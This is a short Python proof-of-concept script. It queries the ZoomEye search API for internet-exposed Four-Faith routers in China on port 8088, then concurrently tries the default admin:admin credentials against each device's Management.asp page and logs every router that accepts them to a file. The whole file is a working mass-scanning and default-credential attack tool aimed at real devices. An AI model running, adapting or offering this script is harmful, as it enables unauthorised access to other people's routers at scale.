# @author:九世
# @time:2019/5/25
# @file:poc.py

from gevent import monkey;monkey.patch_all()
import gevent
import requests
import sys
from multiprocessing import Process

headers_s = { 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36'}
login_s={'Authorization': 'Basic YWRtaW46YWRtaW4='}

class Run:
    def __init__(self,username,password):
        self.username=username
        self.password=password

    def exploit(self,url):
        urls='http://{}:8088'.format(url)
        try:
            rvt=requests.get(url=urls,headers=headers_s,timeout=3)
            if rvt.status_code==200 and rvt.text!='':
                urls='{}/Management.asp'.format(str(rvt.url).rstrip('/'))
                rbt=requests.get(url=urls,headers=login_s)
                if rbt.status_code==200:
                    print('[+] Find the default password url:{} username:admin password:admin'.format(rbt.url))
                    print('url:{} username:admin password:admin'.format(rbt.url),file=open('save.txt','a'))

        except:
            pass

    def xc(self,xt):
        gv=[]
        for x in xt:
            gv.append(gevent.spawn(self.exploit,x))
        print('[+] Detection and survival')
        gevent.joinall(gv)
        print('[+] Survival URLs are stored in:{}/save.txt'.format(sys.argv[0]).replace('/poc.py',''))


    def djc(self,lt):
        rg=[]
        calc=0
        shu=len(lt)
        for l in lt:
            if calc==shu:
                p=Process(target=self.xc,args=(rg,))
                p.start()
                rg.clear()
                calc=0
            rg.append(l)
            calc+=1

        if len(rg)>0:
            p = Process(target=self.xc, args=(rg,))
            p.start()

    def zoomeye(self):
        page=11
        iplist=[]
        url='https://api.zoomeye.org/user/login'
        data={'username':self.username,'password':self.password}
        rqt=requests.post(url=url,json=data)
        if rqt.json()['access_token']:
            print('[+] Log in to zoomeye successfully')
            access_token=rqt.json()['access_token']
            print('[+] access_token:{}'.format(access_token))
            print('[+] Get IP page:{}'.format(page))
            for p in range(1,page):
                url='https://api.zoomeye.org/host/search?query=app%3A"Four-Faith"%20%2Bcountry%3A"CN"%20%2Bport%3A8088%20ver%3A"v2.0.0"%20%2Bapp%3A"Four-Faith%20router%20httpd"&page={}'.format(p)
                headers={'Authorization':'JWT {}'.format(access_token)}
                rqt2=requests.get(url=url,headers=headers)
                matches=rqt2.json()['matches']
                for m in matches:
                    iplist.append(m['ip'])

            self.djc(iplist)
        else:
            print('[-] Login zoomeye failed')
            exit()

if __name__ == '__main__':
    username='zoomeye_username'
    password='zoomeye_password'
    obj=Run(username=username,password=password)
    obj.zoomeye()